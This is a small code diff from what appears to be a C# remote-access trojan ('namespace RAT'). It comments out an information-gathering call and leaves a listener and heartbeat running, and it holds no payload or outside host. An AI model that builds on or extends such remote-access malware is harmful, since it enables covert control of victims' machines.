@@ -22,7 +22,7 @@ namespace RAT
                 LocalIP = GetLocalIPAddress();
                 listener.startR();
                 Task.Factory.StartNew(() => HeartBeat());
-                InfoGather.gather();
+                // InfoGather.gather();
             }
             catch
             {
